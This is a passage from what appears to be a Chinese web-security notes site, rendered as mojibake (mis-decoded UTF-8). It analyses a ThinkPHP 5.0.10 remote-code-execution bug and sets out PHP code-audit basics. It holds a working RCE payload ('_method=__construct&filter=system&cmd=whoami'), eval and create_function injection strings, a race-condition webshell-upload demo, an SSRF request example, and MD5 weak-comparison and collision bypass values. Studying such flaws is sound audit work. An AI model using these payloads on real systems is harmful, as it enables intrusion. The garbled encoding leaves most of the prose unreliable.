è¿˜è®°å¾—ä¸Šé¢çš„å¤„ç†å—ï¼Ÿ æ‰€ä»¥åªéœ€è¦æ„é€ ä¸€ä¸ªå«æœ‰æ•°å­—1çš„å­—ç¬¦ä¸²å°±å¯ä»¥ä¼ªé€ adminçš„èº«ä»½ã€‚ æ³¨å†Œä¸€ä¸ªç”¨æˆ·åä¸º1adminçš„ç”¨æˆ· DedeUserID=last_vid=uid DedeUserID__ckMd5=last_vid__ckMd5 ThinkPHP å®‰è£… composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 å°† composer.json æ–‡ä»¶çš„ require å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ \"require\": { \"php\": \">=5.4.0\", \"topthink/framework\": \"5.0.10\" } æ›´æ–° composer update å°†å…¶æ”¾ç½®åˆ°ç½‘ç«™ç›®å½•ä¸‹ï¼Œè®¿é—®http://127.0.0.1/tp5.0.10/public/ æ¦‚è§ˆ æ¨èé˜…è¯»https://www.cnblogs.com/yokan/p/16102644.html è·¯ç”±å’Œå‚æ•°ä¼ é€’ http://servername/index.php/æ¨¡å—/æ§åˆ¶å™¨/æ“ä½œ/[å‚æ•°å/å‚æ•°å€¼...] # pathinfoæ¨¡å¼ http://servername/index.php?s=/index/Index/index # å…¼å®¹æ–¹å¼ ?name=213 /name/123 å¦‚æ§åˆ¶å™¨Indexï¼šapplication/index/controller/Index.php http://127.0.0.1/tp5.0.10/public/index.php/index/Index/hello?name=world http://127.0.0.1/tp5.0.10/public/index.php/index/Index/hello/name/world http://127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello/name/world http://127.0.0.1/tp5.0.10/public/index.php?s=/index/Index/hello&name=world Requestç±»ä»»æ„è°ƒç”¨__constructæ–¹æ³•å¯¼è‡´çš„rce æ¦‚è¿° Requestæ ¸å¿ƒç±»$method æ¥è‡ªå¯æ§çš„ $_POST æ•°ç»„ï¼Œè€Œä¸”åœ¨è·å–ä¹‹åæ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œç›´æ¥æŠŠå®ƒä½œä¸º Request ç±»çš„æ–¹æ³•è¿›è¡Œè°ƒç”¨ï¼ŒåŒæ—¶ï¼Œè¯¥æ–¹æ³•ä¼ å…¥çš„å‚æ•°æ˜¯å¯æ§æ•°æ® $_POST ã€‚å¯¼è‡´å¯ä»¥éšæ„è°ƒç”¨ Request ç±»çš„éƒ¨åˆ†æ–¹æ³• è¿‡ç¨‹ï¼š è®©methodç­‰äº __constructé­”æœ¯æ–¹æ³•ï¼Œç„¶åé‡Œé¢çš„ foreachå‡½æ•°é€ æˆå˜é‡è¦†ç›–ã€‚ç„¶åé€šè¿‡Request ç±»ä¸­çš„ paramæ–¹æ³•æœ€ç»ˆåˆè°ƒç”¨äº†filterValueæ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¸­å°±å­˜åœ¨å¯åˆ©ç”¨çš„ call_user_func å‡½æ•°ï¼Œä»è€Œæ‰§è¡Œä»»æ„å‘½ä»¤ Request ç±»ä¸­çš„ paramã€routeã€getã€postã€putã€deleteã€patchã€requestã€sessionã€serverã€envã€cookieã€input æ–¹æ³•å‡è°ƒç”¨äº† filterValue æ–¹æ³•ï¼Œè€Œè¯¥æ–¹æ³•ä¸­å°±å­˜åœ¨å¯åˆ©ç”¨çš„ call_user_func å‡½æ•° ä»¥5.0.10ç‰ˆæœ¬ä¸ºä¾‹ payload http://127.0.0.1/tp5.0.10/public/index.php # post _method=__construct&filter=system&cmd=whoami è°ƒè¯• ç¬¬ä¸€ä¸ªæ–­ç‚¹ä¸‹åœ¨thinkphp/libary/think/App.phpæ–‡ä»¶ï¼Œè°ƒç”¨routeCheckè¿›è¡Œè°ƒåº¦è§£æè¿™é‡Œ è·Ÿè¿›routeCheck è·Ÿè¿›check è·Ÿè¿›method var_methodåœ¨application/config.phpä¸­ æ‰€ä»¥è¿™é‡Œå¯ä»¥æ§åˆ¶methodå˜é‡ï¼Œä»è€Œä»»æ„è°ƒç”¨Requestç±»çš„æ–¹æ³•ã€‚ å¦‚æœè°ƒç”¨__constructæ–¹æ³• å­˜åœ¨ä¸€ä¸ªforeachå¾ªç¯ï¼Œå¦‚æœä¼ å…¥çš„optionsæ•°ç»„çš„é”®åä¸ºè¯¥ç±»çš„å±æ€§ï¼Œå°±ç”¨é”®å€¼è¦†ç›–è¯¥å±æ€§çš„å€¼ã€‚ ç»§ç»­å¾€ä¸‹ åœ¨App::run()æ–¹æ³•é‡Œé¢ï¼Œå¦‚æœæˆ‘ä»¬å¼€å¯äº†debugæ¨¡å¼ï¼Œåˆ™ä¼šè°ƒç”¨Request::param()æ–¹æ³•ï¼š å°±ç®—æ²¡æœ‰å¼€å¯debugæ¨¡å¼ï¼Œä¸‹é¢çš„execæ–¹æ³•ä¹Ÿä¼šè°ƒç”¨ è·Ÿè¿›Request::param()æ–¹æ³• å°†è·å–åˆ°çš„postå‚æ•°ç”¨array_mergeä¸getæ–¹å¼çš„å‚æ•°è¿›è¡Œåˆå¹¶ æœ€åå°†å…¶ä¼ å…¥inputä¸­ è·Ÿè¿›Request::input(),array_walk_recursive å¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªæˆå‘˜é€’å½’åœ°åº”ç”¨ç”¨æˆ·å‡½æ•° ç„¶åfilterValueæ–¹æ³•ä¸­ï¼Œè°ƒç”¨äº†call_user_funcé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œ å…³é”®ç‚¹æ€»ç»“ Fromï¼šä¸ƒæœˆç«å¸ˆå‚…çš„ä¸€å¼ æµç¨‹å›¾ å…¶ä»–ç‰ˆæœ¬ æµç¨‹å¤§åŒå°å¼‚ payloadæ€»ç»“ï¼šhttps://y4er.com/posts/thinkphp5-rce/#thinkphp5-method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 22:52:38 "},"03.ä»£ç å®¡è®¡/PHP/phpä»£ç å®¡è®¡åŸºç¡€.html":{"url":"03.ä»£ç å®¡è®¡/PHP/phpä»£ç å®¡è®¡åŸºç¡€.html","title":"PHPä»£ç å®¡è®¡åŸºç¡€","keywords":"","body":"PHPæ ‡ç­¾ #short_open_tag = On phpinfo(); # ASP é£æ ¼çš„æ ‡ç­¾å·²åœ¨ PHP 7.0 ä¸­ç§»é™¤ï¼Œä¸å»ºè®®ä½¿ç”¨ã€‚ ä»£ç æ‰§è¡Œå‡½æ•° eval ä¼ å‚?1=system('payload');ï¼Œéœ€è¦åœ¨è¯­å¥æœ«åŠ ä¸Šï¼› ä¹Ÿå¯ä»¥ä¼ å‚?1=saduasgdasda;system('payload');,å› ä¸ºeval å‡½æ•°åœ¨æ‰§è¡Œæ—¶ï¼Œç¬¬ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥å¹¶ä¸ä¼šå½±å“ç¬¬äºŒæ¡ã€‚ ä¹Ÿå¯ä»¥ä¼ å‚?1=?> assert ?1=system('payload') ä¸éœ€è¦åœ¨è¯­å¥æœ«åŠ ä¸Šï¼› evalå’ŒassertäºŒè€…åŒºåˆ«--æ³¨æ„ php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡$f='assert';$f(...);è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚ ä½†php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç  preg_replaceçš„/eæ¨¡å¼ phpç‰ˆæœ¬ preg_replace('/pattern/e',$command,$value ); åœ¨/eæ¨¡å¼ä¸‹ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…æˆåŠŸï¼Œå°±ä¼šå‘½ä»¤æ‰§è¡Œpreg_replace()çš„ç¬¬äºŒä¸ªå‚æ•° create_function PHP 7.2.0 èµ·è¢«åºŸå¼ƒï¼Œå¹¶è‡ª PHP 8.0.0 èµ·è¢«ç§»é™¤ æ­¤å‡½æ•°åœ¨å†…éƒ¨æ‰§è¡Œ eval()ï¼Œå› æ­¤å…·æœ‰è·Ÿ eval() ç›¸åŒçš„å®‰å…¨é—®é¢˜ã€‚ create_function($a,$b); ç­‰ä»·äº function lambda($a){ $b; } å½“$b=1;}phpinfo();/*æ—¶ function lambda($a){ 1;}phpinfo();/* } æ•´ç†ä¸€ä¸‹ function lambda($a) { 1; } phpinfo(); /*} æ‰§è¡Œäº†phpinfo() call_user_func() call_user_func_array()ï¼Œç¬¬äºŒä¸ªå‚æ•°è¦ä¸ºæ•°ç»„ å˜é‡å‡½æ•° PHP å¦‚æœåœ¨ä¸€ä¸ªå˜é‡åé¢åŠ ä¸Šä¸€å¯¹æ‹¬å·ï¼Œé‚£ä¹ˆè§£é‡Šå™¨ä¼šè¯•å›¾å¯»æ‰¾åå­—å’Œè¿™ä¸ªå˜é‡çš„å€¼ä¸€æ ·çš„ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœæ‰¾åˆ°äº†å°±æ‰§è¡Œå®ƒã€‚ æ‰€ä»¥phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°ã€‚ æ•°ç»„å‡½æ•° array_map ç›¸å½“äºæ‰§è¡Œäº†ä¸¤æ¬¡whoamiå‘½ä»¤ array_filter å‚æ•°ä½ç½®æ¢äº†ä¸€ä¸‹ usortã€uasort PHP å‘½ä»¤æ‰§è¡Œå‡½æ•° ç›¸å…³å‡½æ•° # é»˜è®¤æ— å›æ˜¾ exec() shell_exec()å’Œåå¼•å· popen()ï¼Œproc_open() # é»˜è®¤æœ‰å›æ˜¾ system() passthru() exec() string exec ( å‘½ä»¤ï¼Œç»“æœæ•°ç»„ ï¼ŒçŠ¶æ€ç  ) system() string system ( å‘½ä»¤, çŠ¶æ€ç  ) å®é™…ä¸Šæ˜¯æ‰§è¡Œäº†sh -c \"command\"å‘½ä»¤ system()å‡½æ•°æ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š passthru() void passthru ( å‘½ä»¤, çŠ¶æ€ç  ) å’Œsystemå‡½æ•°ç±»ä¼¼ï¼Œæ‰§è¡Œæœ‰å›æ˜¾ï¼Œå°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ä¸Š shell_exec()å’Œ åå¼•å· string shell_exec( å‘½ä»¤ ) shell_exec()å‡½æ•°é»˜è®¤æ— å›æ˜¾ï¼Œé€šè¿‡ echo å¯å°†æ‰§è¡Œç»“æœè¾“å‡ºåˆ°é¡µé¢ shell_exec() å‡½æ•°å®é™…ä¸Šä»…æ˜¯åæ’‡å· () æ“ä½œç¬¦çš„å˜ä½“ï¼Œå½“ç¦ç”¨shell_execæ—¶ï¼Œ` ä¹Ÿä¸å¯æ‰§è¡Œ åå¼•å·åœ¨phpä¸­ç§°ä¹‹ä¸ºæ‰§è¡Œè¿ç®—ç¬¦ï¼ŒPHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å› popen() resource popen ( string $command , string $mode ) å‡½æ•°éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ‰§è¡Œçš„å‘½ä»¤commandï¼Œå¦å¤–ä¸€ä¸ªæ˜¯æŒ‡é’ˆæ–‡ä»¶çš„è¿æ¥æ¨¡å¼modeï¼Œæœ‰rå’Œwä»£è¡¨è¯»å’Œå†™ã€‚ å‡½æ•°ä¸ä¼šç›´æ¥è¿”å›æ‰§è¡Œç»“æœï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼Œä½†æ˜¯å‘½ä»¤å·²ç»æ‰§è¡Œã€‚ proc_open()å‡½æ•° ä¸popen()ç±»ä¼¼ï¼Œåªæ˜¯å¯ä»¥å¼€ä¸¤ä¸ªç®¡é“ã€‚ æ–‡ä»¶æ“ä½œå‡½æ•° https://www.php.net/manual/zh/ref.filesystem.php fopen() æ¨¡å¼ :- - r è¯» r+ è¯»å†™ï¼Œå‰ç½® w å†™å…¥ï¼Œæˆªæ–­ w+ è¯»å†™ï¼Œæˆªæ–­ a å†™ï¼Œè¿½åŠ  a+ è¯»å†™ï¼Œè¿½åŠ  å†™å…¥æ–‡ä»¶ \"); ?> è¯»å–æ–‡ä»¶ readfile(filename) file_get_contents(filename) highlight_file(filename,é»˜è®¤false) false:æ‰ä¼šå°†å†…å®¹æ‰“å°å‡ºæ¥ show_source(filename) å‘½ä»¤æ‰§è¡Œ åˆ é™¤æ–‡ä»¶ å¤åˆ¶æ–‡ä»¶ copy(æºæ–‡ä»¶,ç›®çš„æ–‡ä»¶) è¯»å–ç›®å½• scandir('.')ç­‰ä»·äºscandir('./')éƒ½æ˜¯å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ ä»¥æ•°ç»„çš„å½¢å¼è¿”å› æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½• glob() ç±»ä¼¼äºfind ä»¥æ•°ç»„çš„å½¢å¼è¿”å› æ–‡ä»¶ä¸Šä¼  Content-Disposition: form-data; name=\"file\"; filename='xxx' # ['file']æ˜¯Content-Dispositionä¸­nameçš„å€¼ $_FILES['file']['name'] å®¢æˆ·ç«¯æ–‡ä»¶åç§° $_FILES['file']['type'] æ–‡ä»¶çš„MIMEç±»å‹ image/jpeg,image/png,application/octet-stream $_FILES['file']['size'] æ–‡ä»¶å¤§å° å•ä½å­—èŠ‚ $_FILES['file']['tmp_name'] æ–‡ä»¶è¢«ä¸Šä¼ åå†æœåŠ¡å™¨ç«¯ä¸´æ—¶æ–‡ä»¶åï¼Œå¯ä»¥åœ¨php.iniä¸­æŒ‡å®š # åŠ å…¥æ–‡ä»¶å¤´ç»•è¿‡ï¼šGIF89a getimagesize() å›¾ç‰‡å¤§å° exif_imagetype() å›¾ç‰‡ç±»å‹ ä¸Šä¼ è¿‡ç¨‹ åœ¨æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œæ–‡ä»¶é»˜è®¤è¢«å‚¨å­˜åœ¨ä¸´æ—¶æ–‡ä»¶å¤¹ä¸­ï¼Œè¿™æ—¶å¿…é¡»æŠŠä»–ä»ä¸´æ—¶ç›®å½•ä¸­åˆ é™¤æˆ–ç§»åŠ¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œå¦åˆ™ï¼Œè„šæœ¬è¿è¡Œå®Œæ¯•åï¼Œè‡ªåŠ¨åˆ é™¤ä¸´æ—¶æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨copyæˆ–è€…move_uploaded_fileä¸¤ä¸ªå‡½æ•°ã€‚ $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; } else { $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } æ¡ä»¶ç«äº‰Demo if(move_uploaded_file($temp_file, $upload_file)){ # move_uploaded_fileæˆåŠŸåæ‰åˆ¤æ–­æ˜¯å¦åˆæ³• if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \"åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\"; unlink($upload_file); } }else{ $msg = 'ä¸Šä¼ å‡ºé”™ï¼'; } åŸç†ï¼šæœåŠ¡ç«¯å…ˆå°†ä¸Šä¼ çš„æ–‡ä»¶å†™å…¥ï¼Œå†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œé€šè¿‡æ¡ä»¶ç«äº‰åœ¨æ–‡ä»¶åˆ é™¤å‰è®¿é—®webshellå†™å…¥æ–°çš„webshellå³å¯ã€‚ SSRFå‡½æ•° file_get_contents å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸² æ”¯æŒæœ¬åœ°æ–‡ä»¶å’Œè¿œç¨‹æ–‡ä»¶ curl_exec() æ‰§è¡Œç»™å®šçš„ curl ä¼šè¯ã€‚ Call to undefined function curl_init()é”™è¯¯è§£å†³ fsockopen ä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ®ã€‚ ?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo data--> GET /flag.php HTTP/1.1 Host: 127.0.0.1 Connection: Close æ–‡ä»¶åŒ…å«å‡½æ•° require():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ include():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­æ‰§è¡Œ require_once()ä¸require()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å« include_once()ä¸include()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å« å˜é‡è¦†ç›– extract() # ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ import_request_variables()--php $$ >>hello world hello world # ${$a}ç­‰åŒäº$hello # å­˜åœ¨å˜é‡è¦†ç›–Demo $auth=0; foreach ($_GET as $key => $value) { $$key=$value; } echo $auth; parse_str(query,variabal) ç”¨æˆ·ä¼ å‚ $_GET $_POST $_COOKIE $_REQUEST $_FILES $_SERVER $GLOBALS $_SERVER[xx] è·å–å½“å‰urlè·¯å¾„çš„å‡½æ•°åŠæœåŠ¡å™¨å˜é‡ https://www.cnblogs.com/qiantuwuliang/archive/2010/02/28/1675279.html $_SERVER[\"QUERY_STRING\"]ï¼šæŸ¥è¯¢(query)çš„å­—ç¬¦ä¸² $_SERVER[\"PHP_SELF\"]ï¼šå½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å è·å–æ‰€æœ‰å˜é‡/å‡½æ•°/å¸¸é‡ get_defined_functions get_defined_constants get_defined_vars å…¶ä»– å¤§å°å†™ åœ¨ PHP ä¸­ï¼Œå…³é”®å­—ï¼ˆä¾‹å¦‚ifã€ elseã€whileã€ echoç­‰ï¼‰ã€ç±»ã€å‡½æ•°å’Œç”¨æˆ·å®šä¹‰çš„å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™ã€‚ ä½†æ˜¯æ‰€æœ‰å˜é‡åéƒ½åŒºåˆ†å¤§å°å†™ï¼ \"; echo \"Hello World!\"; EcHo \"Hello World!\"; ?> -->Hello World! PHPæ¥æ”¶å‚æ•° https://blog.csdn.net/bylfsj/article/details/102770461 https://y4tacker.blog.csdn.net/article/details/120502141 PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] => \"bar\") phpä»è¯·æ±‚çš„urlä¸­å–å‡ºå‚æ•°å¹¶ä¿å­˜ä¹‹å‰ï¼Œå¯¹å‚æ•°åçš„æ“ä½œï¼š 1.åˆ é™¤å‚æ•°åå‰çš„ä¸€äº›ç¬¦å· 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆå°è¯•å[å¥½åƒä¸èƒ½è¢«è§£æä¸º_ï¼‰ 3.åˆ é™¤å‚æ•°ååçš„ä¸€äº›ç¬¦å· å¼±ç±»å‹æ¯”è¾ƒ PHP7ä»¥å‰çš„ç‰ˆæœ¬æ”¯æŒå°†å¤šè¿›åˆ¶çš„æ•°å€¼è½¬æ¢ï¼Œæ‰€ä»¥'1'=='0x1'æ˜¯æˆç«‹çš„ï¼Œä½†æ–°ç‰ˆæœ¬æ˜¯falseã€‚ ==ï¼ˆå®½æ¾æ¯”è¾ƒï¼‰ NULL == false == 0 [false] == [0] == [NULL] == [''] å…¶ä»–æ•°å­—==True æ•°å­—å­—ç¬¦ä¸²ä¸æ•°å­— è¿™æ˜¯å› ä¸ºåœ¨æ‰§è¡Œå…³ç³»è¿ç®—â€==â€œæ—¶è¦æ±‚è¿ç®—ç¬¦ä¸¤è¾¹çš„æ•°æ®ç±»å‹å¿…é¡»ä¸€è‡´(å­—ç¬¦ä¸²ä¸æ•´å‹æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²â†’æ•´å‹)ï¼Œå½“å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´å‹æ—¶ï¼Œå¦‚æœå­—ç¬¦ä¸²ä»¥æ•´å‹å¼€å¤´æˆ–è€…ä»¥ç©ºæ ¼+æ•´å‹å¼€å¤´ï¼Œå°±å–æ•´å‹çš„å€¼ï¼Œåä¹‹åˆ™å–å€¼0. ä¾‹å­ if (!is_numeric($passwd)) { if($passwd==1234567) { echo $flag; } } payload:passwd=1234567sdkasj (ä¸è¦åŠ å¼•å·,é»˜è®¤æ¥æ”¶å­—ç¬¦ä¸²å‚æ•°) 0eç§‘å­¦è®¡æ•°æ³• var_dump(\"0e123456\"==\"0e4456789\"); //true var_dump(\"0e123456\"==\"0easdasd9\");//false è€Œå½“å­—ç¬¦ä¸²ä¸­å«æœ‰0e/0Eæ—¶ï¼Œphpä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œè€Œ0çš„å¤šå°‘æ¬¡æ–¹éƒ½ç­‰äº0ï¼Œæ‰€ä»¥ç›¸ç­‰ã€‚ ===ï¼ˆä¸¥æ ¼æ¯”è¾ƒï¼‰ >>false å…¨ç­‰äºæ“ä½œè¿‡ç¨‹å¦‚ä¸‹ï¼š 1.åˆ¤æ–­ä¸¤è¾¹æ•°æ®ç±»å‹æ˜¯å¦ç›¸åŒ 2.åˆ¤æ–­ä¸¤è¾¹å€¼æ˜¯å¦ç›¸åŒ 3.å°†å‰ä¸¤æ­¥çš„ç»“æœè¿›è¡Œä¸è¿ç®—ï¼Œå¾—å‡ºæœ€ç»ˆç»“æœ MD5ç¼ºé™· â‘ MD5ï¼ˆstring,rawï¼‰å‡½æ•°è§£æ >>276f722736c95d99e921722cf9ed621c 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b\u001c å½“raw=trueæ—¶ï¼Œæµè§ˆå™¨ä¼šå¯¹å…¶è¿”å›çš„æ•°æ®'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1cï¼ˆåŸå§‹äºŒè¿›åˆ¶æ ¼å¼ï¼‰è¿›è¡Œäº†å­—ç¬¦åŒ–å¤„ç†ï¼Œç”±æ­¤å°±ä¼šäº§ç”Ÿä¹±ç ã€‚ æˆ‘ä»¬å¯ä»¥å‘ç°å¾—åˆ°çš„å­—ç¬¦ä¸²å«æœ‰'or'6,,å¯ä»¥ç”¨æ¥è¿›è¡Œsqlæ³¨å…¥ å¦‚select * from 'admin' where password=md5($pass,true) >> 04a5c23ac138da22 2fec392304a5c23ac138da22847f9b7c æˆ‘ä»¬å¯ä»¥å‘ç°md5çš„å¯†æ–‡ä¸­ï¼Œ16ä½å¯†æ–‡ä¸32ä½å¯†æ–‡çš„ç¬¬8-24ä½å­å­—ç¬¦ä¸²æ˜¯ä¸€æ ·çš„ã€‚ â‘¡å¼±ç±»å‹æ¯”è¾ƒ PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œé€šè¿‡!=æˆ–==æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå½“å“ˆå¸Œå€¼å¼€å¤´ä¸º0eæ—¶ï¼Œåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å…¶è§†ä½œä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œè€Œ0çš„å¤šå°‘æ¬¡æ–¹è¿˜æ˜¯0 æ‰€ä»¥MD5('QNKCDZO')==md5('s878926199a') QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 s214587387a 0e848240448830537924465865611904 1586264293 0e622743671155995737639662718498 240610708 0e462097431906509019562988736854 $a==md5($a) $a=0e215962017 md5($a)=0e291242476940776845150308577824 â‘¢å¼ºæ¯”è¾ƒç»•è¿‡ åœ¨ä½¿ç”¨===æˆ–ï¼==æ¥è¿›è¡Œå¼ºæ¯”è¾ƒæ—¶ å¯ä»¥é€šè¿‡æ„é€ å‚æ•°ä¸ºæ•°ç»„ç±»å‹æ¥è¿›è¡Œç»•è¿‡ åŸç†ï¼šmd5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹çš„æ•°å€¼ï¼Œä¼šç›´æ¥è¿”å›NULL é‚£ä¹ˆMD5(param1[])===MD5(param2[])ä»è€Œç»•è¿‡ å½“ç„¶å¼±ç±»å‹æ¯”è¾ƒä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡ if (md5($id) === md5($gg) && $id !== $gg) >>payload:id[]=xxx&gg[]=xxx ä½†æ˜¯å½“é™åˆ¶äº†ä¼ å…¥çš„å‚æ•°å¿…é¡»ä¸ºstringç±»å‹æ—¶ä¸Šè¿°æ–¹æ³•å°±ä¸å¯ä»¥äº† if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) { echo 1; } else { echo 0; } ä½¿ç”¨md5ç¢°æ’ç”Ÿæˆç›¸åŒmd5 ä½¿ç”¨burpå‘é€å¦‚ä¸‹ urlç¼–ç  1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CEZr%C6%1D%28j%22%9E%60%8Dt%AB4%ADU%E5%8B%89%89%E6j%D0FH%EE8%D1%E6%11%18%AB3%A6%EC%E3%B8%2F%3C%97k%0CIt%02%94%92W%9D%ED%B9%EDc%CC%5D%2A%A1%9B%B3%7B%27%13i%05%8A%A7%5E%B3J%BE.R%A6%D7%D5%7C%A4%24%A5%DB%84%D8%E7%A3%03%E4F%EC%1C%95%B1%D6L%88%AD%CD%D5%CF%B6%E8%26%AEff%2A%3B%C9%D9%9B%C8z%7E%DB%A4m%C5%8F%CF%83%06%5E%EA%CCW%B3M%3E%C8 urlç¼–ç  1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%CEZr%C6%1D%28j%22%9E%60%8Dt%AB4%ADU%E5%8B%89%09%E6j%D0FH%EE8%D1%E6%11%18%AB3%A6%EC%E3%B8%2F%3C%97k%0CIt%02%14%93W%9D%ED%B9%EDc%CC%5D%2A%A1%9B%B3%FB%27%13i%05%8A%A7%5E%B3J%BE.R%A6%D7%D5%7C%A4%24%A5%DB%84%D8%E7%23%03%E4F%EC%1C%95%B1%D6L%88%AD%CD%D5%CF%B6%E8%26%AEff%2A%3B%C9%D9%9BHz%7E%DB%A4m%C5%8F%CF%83%06%5E%EA%CC%D7%B3M%3E%C8 å¦‚ä½•ç”Ÿæˆ http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip fastcollå¯ä»¥æ ¹æ®å·²çŸ¥çš„æ•°æ®å¤´ï¼Œåœ¨å…¶åé¢åˆ†åˆ«é™„åŠ ä¸¤ç»„128å­—èŠ‚çš„æ•°æ®ï¼ˆå¦‚æœæ²¡å¯¹é½ï¼Œè¿˜ä¼šåŠ ä¸Šå…¶ä»–æ•°æ®ï¼‰ï¼Œç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¿è¯ä¸¤ä¸ªæ–‡ä»¶çš„MD5å€¼ç›¸åŒã€‚ å¹¶ä¸”æ 